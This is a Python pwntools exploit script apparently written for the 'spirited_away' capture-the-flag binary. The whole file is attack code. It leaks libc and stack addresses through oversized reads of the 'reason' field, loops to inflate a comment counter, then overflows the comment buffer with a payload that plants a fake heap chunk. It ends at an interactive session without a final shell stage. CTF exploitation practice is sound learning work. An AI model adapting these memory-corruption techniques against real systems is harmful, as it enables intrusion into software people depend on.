from pwn import *

BEDUG = True

libc = ELF('./libc.so.6')

if BEDUG == True:
	io = process('./spirited_away_patched', env = {"LD_PRELOAD":"./libc.so.6"})
else:
	io = remote('0.0.0.0', 1337)

def comment(name, reason, cmt):
	io.recvuntil(b'Please enter your name: ')
	io.send(name)
	#io.sendlineafter(b'Please enter your age: ', age)
	io.recvuntil(b'Why did you came to see this movie? ')
	io.send(reason)
	io.recvuntil(b'Please enter your comment: ')
	io.send(cmt)

io.recvuntil(b'Please enter your name: ')
io.send(b'A')
io.sendlineafter(b'Please enter your age: ', b'A')
io.recvuntil(b'Why did you came to see this movie? ')
io.send(b'A')
io.recvuntil(b'Please enter your comment: ')
io.send(b'A')
io.sendlineafter(b'<y/n>: ', b'y')

comment(b'A', b'A'*20, b'B')
io.recvuntil(b'Reason: ')
io.recv(20)
libc.address = u32(io.recv(4)) - 0x5f29b
io.sendlineafter(b'<y/n>: ', b'y')
comment(b'A', b'A'*0x38, b'B')
io.recvuntil(b'Reason: ')
io.recv(0x38)
stack_leaked = u32(io.recv(4))
fake_chunk = stack_leaked - 92
io.sendlineafter(b'<y/n>: ', b'y')

log.info('Libc: '+hex(libc.address))
log.info('Stack: '+hex(stack_leaked))
log.info('Fake chunk: '+hex(fake_chunk))

for i in range(7):
	io.recvuntil(b'Please enter your name: ')
	io.send(b'y')
	io.recvuntil(b'Why did you came to see this movie? ')
	io.send(b'y')
	io.recvuntil(b'Please enter your comment: ')
	io.send(b'y')
	io.sendlineafter(b'<y/n>: ', b'y')

for i in range(90):
	io.recvuntil(b'Why did you came to see this movie? ')
	io.send(b'y')
	io.sendlineafter(b'<y/n>: ', b'y')

payload = p32(fake_chunk+0x33) + p32(0)*4+p32(0x41)

comment(b'A', b'ok', b'A'*84+payload)
pause()


io.interactive()